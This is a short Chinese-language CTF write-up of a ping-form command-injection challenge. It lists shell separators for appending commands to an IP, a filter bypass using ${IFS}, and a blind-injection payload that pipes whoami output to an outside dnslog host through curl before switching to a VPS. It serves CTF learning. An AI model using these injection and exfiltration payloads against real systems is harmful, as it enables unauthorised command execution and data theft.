# week3

懒怠了，今天打打渔 

## Ping To The Host

界面打开，ping一下这种题目，命令执行呗

之前的做法是 形如ip+连接符+code 

```
127.0.0.1&&+code  只有在 && 左边的命令返回真（命令返回值 $? == 0），&& 右边的命令才 会被执行。
127.0.0.1&+code  &表示将任务置于后台执行
127.0.0.1||+code  只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。
127.0.0.1|+code  | 表示管道，上一条命令的输出，作为下一条命令的参数
127.0.0.1;+code  多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块
```

试了一下 ；被过滤了 

![image-20230124124307900](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124124307900.png)![image-20230124124328199](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124124328199.png)

但都没有回显，和之前做的不一样，搜一搜《命令执行不回显》

https://blog.csdn.net/weixin_33164837/article/details/112421828

是什么命令执行外带 

先试了dnslog

|curl `whoami`.gbpiyl.dnslog.cn

waf了啥东西不能用啊 

![image-20230124124903888](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124124903888.png)//形如此般的测试一下 空格被过滤啦

用了<> %20 等 ${IFS}是ok的

![image-20230124125135172](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124125135172.png)

![image-20230124125614888](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124125614888.png)

都还顺利，但不知道为啥这里就不行了

就改用vps

![image-20230124130327453](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124130327453.png)



![image-20230124130405226](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124130405226.png)

解码找到flag_is_here_haha

![image-20230124130527628](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124130527628.png)

又waf  测试了疑似过滤flag

![image-20230124130607930](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124130607930.png)

![image-20230124130631707](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20230124130631707.png)

解码  ok

